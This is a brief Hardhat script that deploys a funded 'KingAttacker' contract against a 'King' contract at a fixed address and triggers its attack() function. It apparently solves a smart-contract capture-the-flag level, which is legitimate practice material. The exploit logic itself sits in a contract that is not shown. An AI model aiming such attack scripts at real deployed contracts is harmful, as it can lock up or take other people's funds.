import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';
import web3 from 'web3';

const CONTRACT_NAME = 'King';
const ATTACKER_NAME = 'KingAttacker';
const CONTRACT_ADDRESS = '0x6A50479a8452E49eFE751d811c007890bbE5B64d';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const valueToSend = web3.utils.toWei('0.2', 'ether');
  const attackerContract = await attackerFactory.deploy(contract.address, {
    value: valueToSend,
  });
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(6);
  console.log('Attacker Contract deployed to:', attackerContract.address);
  tx = await attackerContract.attack(1100000000000001);
  await tx.wait(2);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
